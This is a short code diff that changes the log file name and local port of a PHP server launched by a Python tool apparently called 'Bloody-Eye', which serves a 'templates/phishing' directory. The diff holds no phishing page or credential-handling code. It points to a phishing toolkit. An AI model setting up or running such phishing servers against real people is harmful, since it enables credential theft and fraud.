@@ -547,8 +547,8 @@ exit();""")
     if v == "01":
        # - - - - - - - - - - -- - - - - - - - - - - - - - - -
        def deafult_server():
-           with open("logs/","w") as deafult:
-              Popen(('php','-S','localhost:4545','-t','../Bloody-Eye/templates/phishing'),stdout=deafult,stderr=deafult)
+           with open("log","w") as deafult:
+              Popen(('php','-S','localhost:6060','-t','../Bloody-Eye/templates/phishing'),stdout=deafult,stderr=deafult)
     
        deafult_server()
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
